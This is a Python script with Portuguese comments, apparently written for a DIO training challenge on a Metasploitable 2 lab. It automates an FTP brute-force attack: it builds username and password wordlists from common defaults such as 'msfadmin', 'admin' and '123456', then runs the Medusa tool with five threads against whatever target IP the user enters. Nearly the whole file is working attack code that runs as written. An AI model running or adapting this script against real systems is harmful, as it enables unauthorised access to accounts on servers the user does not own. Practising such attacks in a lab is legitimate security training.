import os
import sys
import subprocess

# --- Configurações ---
USERS_FILE = "users_ftp.txt"
PASS_FILE = "pass_ftp.txt"
DEFAULT_USERS = ["msfadmin", "ftpuser", "support", "guest", "admin", "test"]
DEFAULT_PASSWORDS = ["password", "123456", "admin", "msfadmin", "welcome", "access"]

def get_custom_list(list_name, default_list):
    """Permite ao usuário adicionar itens personalizados à lista padrão."""
    custom_list = list(default_list)
    
    resposta = input(f"1 - Deseja adicionar um {list_name} personalizado? (s/n): ").lower()
    if resposta in ['s', 'sim']:
        print(f"\nDigite os {list_name}s que deseja adicionar (um por linha). Digite 'fim' para terminar.")
        while True:
            item = input(f"Adicionar {list_name} (ou 'fim'): ").strip()
            if item.lower() == 'fim':
                break
            if item and item not in custom_list:
                custom_list.append(item)
    return custom_list

def save_list_to_file(file_name, data_list):
    """Salva a lista final em um arquivo de texto."""
    try:
        with open(file_name, 'w') as f:
            f.write('\n'.join(data_list) + '\n')
        print(f"[SUCESSO] Lista de {file_name} criada com {len(data_list)} itens.")
    except Exception as e:
        print(f"[ERRO] Falha ao salvar o arquivo {file_name}: {e}")
        sys.exit(1)

def executar_medusa_ftp(target_ip):
    """Executa o comando Medusa para o serviço FTP."""
    print("\n==================================================")
    print("📢 ETAPA DE EXECUÇÃO DO MEDUSA (FTP) INICIADA 📢")
    print(f"🚀 Executando Força Bruta FTP contra {target_ip}...")
    print("==================================================")

    medusa_command = ["medusa", "-h", target_ip, "-U", USERS_FILE, "-P", PASS_FILE, "-M", "ftp", "-t", "5"]
    
    print(f"Comando: {' '.join(medusa_command)}")
    
    try:
        # Executa o comando e exibe a saída em tempo real
        subprocess.run(medusa_command, check=True)
        print("\n✅ FIM da execução do Medusa. Verifique as credenciais encontradas acima.")
    except FileNotFoundError:
        print("\n[ERRO] A ferramenta 'medusa' não foi encontrada. Certifique-se de estar no Kali Linux.")
    except subprocess.CalledProcessError as e:
        # Medusa geralmente retorna um código de erro mesmo que encontre credenciais.
        # Capturamos o erro, mas informamos que a execução foi concluída.
        print(f"\n[INFO] Medusa concluído. Verifique o resultado acima.")

def main():
    print("--- 💻 Desafio DIO: Automação de Força Bruta FTP (Python) ---")
    
    # 1. Criar e Personalizar a Lista de Usuários
    user_list = get_custom_list("usuário", DEFAULT_USERS)
    save_list_to_file(USERS_FILE, user_list)
    
    # 2. Criar e Personalizar a Lista de Senhas
    pass_list = get_custom_list("senha", DEFAULT_PASSWORDS)
    save_list_to_file(PASS_FILE, pass_list)
    
    # 3. Executar o Medusa
    target_ip = input("➡️ Digite o IP do ALVO VULNERÁVEL (Metasploitable 2): ").strip()
    if not target_ip:
        print("[ERRO] IP do alvo não fornecido. Abortando.")
        return

    executar_medusa_ftp(target_ip)
    
    # Limpeza
    os.remove(USERS_FILE)
    os.remove(PASS_FILE)
    print(f"\n--- Limpeza de Arquivos Temporários ---\nArquivos {USERS_FILE} e {PASS_FILE} removidos.")

if __name__ == "__main__":
    main()